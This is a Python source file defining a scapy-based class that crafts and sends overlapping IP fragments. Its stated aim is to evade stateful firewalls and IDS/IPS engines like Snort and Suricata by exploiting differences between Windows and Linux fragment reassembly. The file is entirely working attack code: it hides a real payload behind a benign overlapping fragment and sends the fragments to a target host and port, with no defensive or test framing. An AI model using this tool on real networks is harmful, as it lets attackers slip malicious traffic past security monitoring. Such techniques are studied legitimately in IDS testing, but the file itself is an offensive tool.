import logging
import random
from typing import List, Optional
from scapy.all import IP, TCP, send

logger = logging.getLogger("usare.overlap_fragment")

class OverlapFragmenter:
    """
    Crafts explicitly overlapping IP fragments to bypass or confuse
    Stateful Firewalls, IDS, and IPS engines (like Snort/Suricata).
    
    Exploits the fact that different OS stacks (Windows vs Linux vs BSD)
    prioritize overlapping fragment data differently (First-in vs Last-in).
    """
    def __init__(self, target_ip: str, target_port: int, os_target: str = "windows"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.os_target = os_target.lower()
        self.ip_id = random.randint(1000, 65000)

    def generate_overlapping_fragments(self, payload: bytes) -> List[IP]:
        """
        Splits a payload into fragments where a 'benign' fragment covers
        the same offset as a 'malicious' fragment. 
        
        Windows generally prefers the original (first received) fragment data.
        Linux generally prefers the overlapping (later received) fragment data.
        """
        # Split payload in half realistically
        midpoint = len(payload) // 2
        # Ensure 8-byte alignment for fragments (mandatory for IP fragmentation)
        midpoint = midpoint + (8 - (midpoint % 8)) if midpoint % 8 != 0 else midpoint
        
        first_half = payload[:midpoint]  # type: ignore[index]
        second_half = payload[midpoint:]  # type: ignore[index]
        
        # Forge a benign chunk of the same size as the first half
        benign_half = b"A" * len(first_half)
        
        fragments = []
        
        if self.os_target == "windows":
            # For Windows: Send real payload first. 
            # Send benign overlapping payload second.
            # IDS might trigger on the benign overlap, but Windows processes the real one.
            frag1 = IP(dst=self.target_ip, id=self.ip_id, flags="MF", frag=0) / first_half
            frag1_overlap = IP(dst=self.target_ip, id=self.ip_id, flags="MF", frag=0) / benign_half
            frag2 = IP(dst=self.target_ip, id=self.ip_id, flags=0, frag=midpoint // 8) / second_half
            
            fragments.extend([frag1, frag1_overlap, frag2])
            
        else: # Linux/BSD bias
            # For Linux: Send benign payload first.
            # Send real overlapping payload second.
            # IDS analyzes benign, Linux overwrites with the real payload.
            frag1_benign = IP(dst=self.target_ip, id=self.ip_id, flags="MF", frag=0) / benign_half
            frag1_real = IP(dst=self.target_ip, id=self.ip_id, flags="MF", frag=0) / first_half
            frag2 = IP(dst=self.target_ip, id=self.ip_id, flags=0, frag=midpoint // 8) / second_half
            
            fragments.extend([frag1_benign, frag1_real, frag2])
            
        return fragments

    def inject_tcp_overlap(self, sport: int, flags: str = "S", payload: bytes = b""):
        """
        Wraps a full TCP segment inside overlapping IP fragments.
        """
        tcp_layer = TCP(sport=sport, dport=self.target_port, flags=flags, 
                        seq=random.randint(1000, 4000000000), 
                        window=8192)
        
        # We must serialize the TCP layer + payload down to raw bytes to fragment it properly at the IP level
        raw_tcp_bytes = bytes(tcp_layer / payload)
        
        # Only fragment if the packet is large enough, otherwise it drops below 8-byte boundaries predictably
        if len(raw_tcp_bytes) <= 16:
            # Just send standard if it's too small to meaningfully overlap
            logger.debug("[Overlap] TCP Segment too small for overlapping, firing cleanly.")
            send(IP(dst=self.target_ip)/tcp_layer/payload, verbose=0)
            return

        frags = self.generate_overlapping_fragments(raw_tcp_bytes)
        
        logger.debug(f"[Overlap] Dispatching {len(frags)} overlapping IP fragments targeting {self.os_target} reassembly logic.")
        for frag in frags:
            send(frag, verbose=0)
            
        return True
